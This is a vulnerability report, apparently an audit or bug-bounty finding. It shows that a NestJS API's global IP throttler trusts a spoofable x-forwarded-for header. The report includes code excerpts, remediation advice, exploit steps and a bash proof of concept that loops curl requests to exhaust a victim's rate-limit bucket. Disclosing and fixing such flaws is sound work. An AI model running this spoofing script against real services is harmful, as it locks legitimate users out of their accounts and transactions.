### Title
IP Throttle Bucket Exhaustion via Spoofed `x-forwarded-for` Header Allows Targeted DoS of Any User

### Summary
The global `IpThrottlerGuard` derives its rate-limit tracking key directly from the attacker-controlled `x-forwarded-for` HTTP header without any validation. An unauthenticated attacker can set this header to any victim's real IP address and rapidly exhaust that IP's rate-limit quota, causing all subsequent legitimate requests from the victim to be rejected with HTTP 429 — a direct analog to the Optimism `MAX_RESOURCE_LIMIT` exhaustion pattern where a shared per-identity resource bucket is drained by a third party.

### Finding Description

`IpThrottlerGuard.getTracker()` unconditionally trusts the `x-forwarded-for` header:

```typescript
// back-end/apps/api/src/guards/ip-throttler.guard.ts
protected getTracker(req: Record<string, any>): Promise<string> {
    const clientIp = req.headers['x-forwarded-for'] || req.ip;
    ...
    return clientIp;
}
``` [1](#0-0) 

This guard is registered as a **global** `APP_GUARD`, meaning it applies to every single API endpoint:

```typescript
// back-end/apps/api/src/api.module.ts
{
  provide: APP_GUARD,
  useClass: IpThrottlerGuard,
},
``` [2](#0-1) 

The `IpThrottlerModule` configures two buckets keyed on this spoofable tracker value — a per-second and a per-minute limit: [3](#0-2) 

**Exploit path:**

1. Attacker learns (or guesses) the victim's real IP address.
2. Attacker sends rapid HTTP requests to any API endpoint with `x-forwarded-for: <victim-IP>`.
3. The throttler increments the counter in Redis under the victim's IP key.
4. Once the `global-second` or `global-minute` limit is hit, the throttler rejects all further requests from that key with HTTP 429.
5. When the real victim sends a legitimate request from their actual IP, the same Redis key is checked and the bucket is already exhausted — the victim is blocked.

No authentication is required. The attacker does not need to flood the server; they only need to send enough requests to fill the victim's quota (e.g., `GLOBAL_SECOND_LIMIT` requests per second).

### Impact Explanation

Any unauthenticated attacker can selectively block any specific user from accessing the entire API — including login, transaction submission, signing, and execution endpoints — for the duration of the throttle window. This constitutes targeted, sustained service denial against individual users with no collateral load on the server.

### Likelihood Explanation

The attack requires no credentials, no privileged access, and no special tooling — only the ability to set an HTTP header. The victim's IP is often discoverable (e.g., from DNS, prior connections, or social engineering). The cost is negligible: a handful of HTTP requests per throttle window suffices to keep the victim locked out indefinitely.

### Recommendation

1. **Never trust `x-forwarded-for` from the raw request.** Only read it if the request originates from a known, trusted reverse proxy (validated by source IP or a signed header).
2. Use NestJS's built-in `trust proxy` setting (Express `app.set('trust proxy', N)`) so that `req.ip` is already correctly resolved by the framework from a trusted proxy chain — then use only `req.ip` in `getTracker`.
3. If `x-forwarded-for` must be used, extract only the **last** (rightmost) IP added by the trusted proxy, not the full header value which is entirely attacker-controlled.

### Proof of Concept

```bash
VICTIM_IP="203.0.113.42"   # victim's real IP
API="https://api.example.com"

# Exhaust victim's per-second bucket (repeat each second)
for i in $(seq 1 $GLOBAL_SECOND_LIMIT); do
  curl -s -o /dev/null \
    -H "x-forwarded-for: $VICTIM_IP" \
    -H "x-frontend-version: 99.0.0" \
    "$API/auth/login" &
done
wait

# Victim's real request now returns HTTP 429
curl -v \
  -H "x-forwarded-for: $VICTIM_IP" \
  -H "x-frontend-version: 99.0.0" \
  "$API/auth/login"
# Expected: HTTP 429 Too Many Requests
```

The victim, sending from their real IP (which matches the now-exhausted Redis key), receives 429 for the remainder of the throttle window. The attacker repeats this each window to maintain the block indefinitely.

### Citations

**File:** back-end/apps/api/src/guards/ip-throttler.guard.ts (L7-13)
```typescript
  protected getTracker(req: Record<string, any>): Promise<string> {
    const clientIp = req.headers['x-forwarded-for'] || req.ip;
    if (!clientIp) {
      throw new HttpException('Unable to determine client IP', HttpStatus.INTERNAL_SERVER_ERROR);
    }
    // console.log('client IP', clientIp.replace(/^.*:/, ''));
    return clientIp;
```

**File:** back-end/apps/api/src/api.module.ts (L74-77)
```typescript
    {
      provide: APP_GUARD,
      useClass: IpThrottlerGuard,
    },
```

**File:** back-end/apps/api/src/throttlers/ip-throttler.module.ts (L13-24)
```typescript
        throttlers: [
          {
            name: 'global-minute',
            ttl: seconds(60),
            limit: configService.getOrThrow<number>('GLOBAL_MINUTE_LIMIT'),
          },
          {
            name: 'global-second',
            ttl: seconds(1),
            limit: configService.getOrThrow<number>('GLOBAL_SECOND_LIMIT'),
          },
        ],
```
